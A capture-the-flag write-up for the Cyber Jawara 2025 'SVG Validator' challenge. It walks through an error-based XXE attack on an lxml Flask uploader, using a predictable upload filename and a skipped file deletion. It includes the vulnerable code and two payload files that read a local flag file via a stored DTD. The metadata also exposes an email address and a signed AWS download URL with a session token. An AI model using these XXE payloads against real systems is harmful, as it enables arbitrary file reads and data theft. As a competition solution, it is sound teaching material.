---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466QHMWQHLN%2F20250522%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250522T100306Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBoaCXVzLXdlc3QtMiJHMEUCIQCMQjHuuOSAaQ7f1Bqr07bFg3Hn409pTRamnfl3pbiS4wIgPp1UPvgG21gZvGRnIUXwck3QHjfNSmZUuaWz%2F%2BuFpSUqiAQI0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDPeg%2F4%2FFHSGqVbBE9ircA1rR%2B%2BLRu14cwWt9ZQe%2FNi93vl7tAORmHzd9O54I740umjQN8%2FibdyhAQZHD3RdQmuvtbb3glIDPJKB7J49wLKqwGokRZoZ8X8YMJWaBLnDwrc0pVhSe23KQxk0fEg%2FG1YNzdh3S5exzCPZWDfs76ImQeHJY7FmbhOhhOTohb2IaesQ%2BGofChDh%2BEOzlNX4%2F1g%2BKbWuvIV1VL5EZlYN31BuE75TulSkVseC10pydTaEn%2FzUo0JZ5yzXGEY1RQakyfI1OidyLPxTfziCeN5Zy5A4Y4%2FqbJhH48NiXQvIN1dmdAvzmukCp%2B%2BFPC3bYEgmm%2F0wKJ10Ftkv0kedGn20ARJCyf38F2qamG5dKUGOj0H7ffOo%2BtWNLMmKlrq9M%2F9ykUIJ81ElwPzUKUTtomCmbGzzmGNxaguR0SxA%2FWvZH8JU1pNM8O73AYJ3zPt9B7xBn0CUOM4C%2FQcXJiOZiWb7hCkx0U5izjktmsa0f%2Fe%2FHaOoGThsy3e3E%2FTxQqOcifNNp6x3e8FCaRCTWck4avQHuRtB2sUF0tHLMPuCDR2JtqFffBatpxqEu0n%2FjPo48lSBjPTNwnGk0ESy%2BRtajU4YoLmNviemTE2gM2237JC7rF%2FJDnG2fOsa6lqcjIhM%2BMI%2Fdu8EGOqUBLxQiZLUSoNZvt3ETf%2FXWh%2FpROjWKYSqW5%2BQYvv0JiZDDFiWbN9b6q8NiET0%2FBq2HHMXIZ4USox%2BwqBkOsTrESuy5LkjC0Iwp0%2Be7zRNvOHGesN1ZeTByJQKVdjgXphQzWSXSyn33ugkUbPpRiKL%2FkIyf6lol1zPXEpfetIILWcTkVtLUsQ%2BHzPdQEhvxnyVedyyEG0BnRn0djjoxgX%2FfGbPsS2hB\&X-Amz-Signature=5ef0daf56f81f5868ecf25d98cb901a6b2a0200e2ff1c00ae8cee6773f27f4fa\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
